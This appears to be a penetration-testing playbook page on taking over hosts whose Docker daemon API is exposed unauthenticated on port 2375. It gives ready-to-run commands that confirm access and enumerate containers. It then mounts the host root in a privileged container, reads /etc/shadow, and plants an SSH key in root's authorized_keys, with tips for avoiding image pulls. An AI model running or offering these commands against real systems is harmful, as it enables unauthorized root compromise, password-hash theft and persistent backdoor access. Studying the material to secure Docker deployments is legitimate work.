---
title: "Unauthenticated daemon access: full control over an open port 2375"
order: 1
description: "Docker's daemon on TCP 2375 serves its API in plain HTTP with no authentication. Any client that can reach the port issues API calls as if it were local root: listing and exec-ing into containers, reading environment secrets, and launching a new privileged container that mounts the host root, giving complete host compromise."
keywords:
  - docker 2375
  - unauthenticated docker
  - docker api
  - remote code execution
  - host takeover
---

# Unauthenticated daemon access

Port 2375 is the Docker daemon's plain-HTTP API endpoint. It carries no authentication and no transport security, so every request is honoured as a local, root-privileged operation. An exposed 2375 is therefore not an information leak but an immediate full compromise: the caller has the same power as the host's root user through the daemon.

Confirm access and point the Docker CLI at it:

```bash
curl -s http://<target>:2375/version                 # version/info => reachable and open
export DOCKER_HOST=tcp://<target>:2375
docker info                                           # the CLI now drives the remote daemon
docker ps -a; docker images                           # enumerate the environment
```

## From access to host root

The daemon can create a container that mounts the host root and runs privileged; one command owns the host:

```bash
docker -H tcp://<target>:2375 run -v /:/host --privileged --rm -it alpine \
  chroot /host sh
# or non-interactively, read a host secret and plant a key
docker -H tcp://<target>:2375 run -v /:/host --rm alpine \
  sh -c 'cat /host/etc/shadow; echo "ssh-ed25519 AAAA... a" >> /host/root/.ssh/authorized_keys'
```

Without the CLI, the same is done over the raw API with `curl`, creating a container with `HostConfig.Binds` of `/:/host` and `Privileged:true`, as on [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md). Enumeration of what is already present often yields secrets faster than a fresh container; see [API enumeration](api-enumeration.md).

## Exploitation notes

- No credentials are involved; reachability is the only gate, so the find-and-own step is a single `docker -H` command once the port responds.
- Reuse an image already present on the host (`docker images`) to avoid a pull; any Linux image works since you immediately `chroot` the host root.
- The container runs as real host root unless the daemon is in rootless mode; `docker info` shows `rootless` under security options if so, which constrains what the mount yields.

## References

- [Docker: protect the daemon socket](https://docs.docker.com/engine/security/protect-access/)
- [HackTricks: 2375 Docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
- [Docker Engine API: containers](https://docs.docker.com/reference/api/engine/)
